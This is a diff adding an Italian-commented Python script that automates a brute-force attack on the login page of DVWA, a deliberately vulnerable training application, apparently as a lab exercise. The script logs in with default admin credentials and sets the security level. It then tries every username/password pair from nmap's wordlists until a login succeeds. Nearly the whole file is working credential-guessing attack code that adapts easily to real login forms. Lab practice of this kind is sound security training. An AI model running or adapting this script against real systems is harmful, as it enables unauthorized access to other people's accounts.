@@ -1,0 +1,88 @@
+import mechanicalsoup
+import requests
+import time
+
+
+browser = mechanicalsoup.StatefulBrowser()
+
+# [STA] PATH INPUT
+# FULL STANDARD PATH
+# browser.open("http://192.168.1.250/dvwa/login.php")
+# HERE REPLACED BY CUSTOM INPUTS
+
+ip = input('Inserire IP target: ')
+print('Inserire un indirizzo, o premere "invio" per l"indirizzo standard: ')
+path = input("Indirizzo standard DVWA: dvwa/login.php: ")
+if path == "":
+     path = 'dvwa/login.php'
+browser.open(f"http://{ip}/{path}")# Joins the user inputs IP/Path
+# [END] PATH INPUT
+# [STA] ENTERS DVWA
+browser.select_form('form[action="login.php"]')
+browser["username"] = "admin"
+browser["password"] = "password"
+browser.submit_selected()
+# [END] ENTERS DVWA
+# [STA] MOVES TO SECURITY.PHP, SETS SECURITY LEVEL
+browser.follow_link("security.php")
+print(browser.get_url())
+print("Scegli il livello di sicurezza su cui vuoi usare il BruteForce")
+print("1 = low; 2 = medium; 3 = high")
+scelta = input("Inserisci il livello di sicurezza: ")
+if (scelta == "1"):
+        browser.select_form('form[action="#"]')
+        browser["security"] = "low"
+elif (scelta == "2"):
+        browser.select_form('form[action="#"]')
+        browser["security"] = "medium"
+elif (scelta == "3"):
+        browser.select_form('form[action="#"]')
+        browser["security"] = "high"
+else:
+        print("Scelta non valida")
+browser.submit_selected()
+browser.follow_link("vulnerabilities/brute/")
+# [END] MOVES TO SECURITY.PHP, SETS SECURITY LEVEL
+# [STA] DATA SETUP
+# USERNAMES SOURCE
+print('Inserire il percorso del file contenente gli username,')
+print('o premere invio per utilizzare il file di default')
+username_file = input('Default: /usr/share/nmap/nselib/data/usernames.lst: ')
+if username_file == "":
+     username_file = '/usr/share/nmap/nselib/data/usernames.lst'
+# PASSWORDS SOURCE
+print('Inserire il percorso del file contenente le password,')
+print('o premere invio per utilizzare il file di default')
+password_file = input('Default: /usr/share/nmap/nselib/data/passwords.lst: ')
+if password_file == "":
+     password_file = '/usr/share/nmap/nselib/data/passwords.lst'
+# [END] DATA SETUP
+# [STA] BRUTEFORCE ROUTINE
+def brute_force():
+    start = time.time()
+    with open(username_file) as f:
+        usernames = f.read().splitlines()
+    with open(password_file) as f:
+        passwords = f.read().splitlines()
+    attempts = 0
+    print("\nBrute force in corso con le seguenti coppie di username - password\n")
+    for user in usernames:
+        for password in passwords:
+            print(f'{user} - {password}')
+            attempts += 1
+
+            browser.select_form('form[action="#"]')
+            browser["username"] = user
+            browser["password"] = password
+            response = browser.submit_selected()
+
+            if "Welcome to the password protected area" in response.text:
+                print(f"\nAccesso riuscito con {user} - {password}")
+                end = time.time()
+                print(f'\nNumero di tentativi prima di trovare user e password:  {attempts}')
+                print(f'- Tempo impiegato: {end-start:.2f} secondi')
+                return
+            else:
+                browser.follow_link('vulnerabilities/brute/')
+# [END] BRUTEFORCE ROUTINE
+brute_force()
